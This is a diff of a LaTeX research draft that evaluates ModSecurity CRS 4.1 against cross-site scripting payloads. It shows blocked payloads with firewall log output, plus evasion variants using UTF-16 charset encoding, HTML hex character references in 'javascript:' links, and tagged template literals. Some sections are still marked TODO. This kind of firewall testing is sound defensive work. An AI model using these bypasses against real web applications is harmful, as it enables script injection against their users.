@@ -52,7 +52,7 @@ Tests have shown that using Unicode encoding in JSON and substituting the \verb|
 
 \subsubsection{Unicode Normalization}
 \label{sec:uninormsingleiter}
-The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall:
+The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall using CRS 4.1:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
 <payload>alert("normalizeMe")</payload>
@@ -80,7 +80,7 @@ will convert the string to the original payload:
 "alert('normalizeMe')"
 \end{lstlisting}
 
-As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally. 
+As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally.
 
 
 \subsubsection{Case Alternation}
@@ -156,21 +156,104 @@ Many rules that are delivered as part of the CoreRuleSet in version 4.1 use the 
 
 \subsubsection{Charset Alternation}
 \label{sec:charaltsingleiter}
+The ModSecurity firewall using CRS4.1 blocks the payload:
 
-{\color{red}TODO }
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=charset alternation example blocked, label={lst:charsetaltexampleblocked}]
+<payload>"<script>alert("xss")</script>"</payload>
+
+<message>"XSS Attack Detected via libinjection"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "116"] [id "941100"]<fileDetails>
+<MatchedData>"<script>alert(\x22xss\x22)</script>"</MatchedData>
+
+<message>"XSS Filter - Category 1: Script Tag Vector"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "142"] [id "941110"]<fileDetails>
+<MatchedData>"<script>"</MatchedData>
+
+<message>"NoScript XSS InjectionChecker: HTML Injection"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "234"] [id "941160"]<fileDetails>
+<MatchedData>"<script"</MatchedData>
+
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "748"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+after encoding the payload to \verb|UTF-16|, the payload:
+
+\begin{lstlisting}[style=basicStyle]
+\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x00'\x00x\x00s\x00s\x00'\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00
+\end{lstlisting}
+
+successfully evades the filtering of the firewall. In order to for this payload to have any effect, the Web server receiving the HTTP request containing this payload needs to be informed that this payload is encoded in \verb|UTF-16|. For that purpose, the HTTP header: \\
+\verb|Content-Type: text/html; charset=utf-16| is added to the request.
+
+The ModSecurity firewall using CRS4.1 does not allow specifying \verb|UTF-16| as charset in the \verb|Content-Type| header:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=utf-16 charset header blocked, label={lst:utf16charsetheaderblocked}]
+<payload>-H 'Content-Type: text/html; charset=utf-16'</payload>
+
+<message>"Request content type charset is not allowed by policy"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1021"] [id "920480"]<fileDetails>
+<MatchedData>"utf-16"</MatchedData>
+\end{lstlisting}
+
+The firewall log further states that the firewall 
+
+\begin{quote}
+	Matched "Operator `Within' with parameter `|utf-8| |iso-8859-1| |iso-8859-15| |windows-1252|' against variable `TX:content\_type\_charset'
+\end{quote}
+
+Subsequently, every encoding permitted by this rule has been tested with the initial payload. There is no difference between the string in any of the allowed encodings. As it seems, the byte representation of first 127 characters is equal between all tested encodings. \cite{enc/diffa, enc/diffb, enc/diffc} Therefore, none of the allowed encodings can be used to create a bypassing payload from the initial payload. 
+
 
 \subsubsection{HTML character references}
 \label{sec:htmlcharrefsingleeva}
-{\color{red}TODO }
+The example payload mentioned under Section~\ref{sec:htmlcharreftech} has been tested against the ModSecurity firewall using CRS4.1:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss injection blocked, label={lst:storedxssinjblocked}]
+<payload><a href=javascript:alert('a')>ClickMeFor$</a></payload>
+
+<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "259"] [id "941170"]<fileDetails>
+<MatchedData>"javascript:alert('a')>ClickMeFor$<"</MatchedData>
+
+<message>"IE XSS Filters - Attack Detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "357"] [id "941210"]<fileDetails>
+<MatchedData>"javascript:a"</MatchedData>
+
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "748"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+On escaping the first \verb|a| in \verb|javascript:| using the HTML hex character reference, the payload becomes:
+
+\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
+<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
+\end{lstlisting}
+
+This payload bypasses the rules with ids \verb|941170| (NoScript XSS InjectionChecker: Attribute Injection) and \verb|941210|(IE XSS Filters - Attack Detected). 
+
+As this result is promising, another iteration of applying this technique has been used in the multi iteration evaluation. The results are stated unter Section~\ref{sec:doublehtmlcharref}.
+
 
 \subsubsection{Function Constructor}
 \label{sec:functionconstructorsingleeva}
+
 {\color{red}TODO also: mention global objects here \cite{js/builtin}}
 
 \subsubsection{Tagged Template Literals}
 \label{sec:taggedtemplateliteralsevaluation}
 As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
-After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server: 
+After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
 <payload>alert("XSS")</payload>
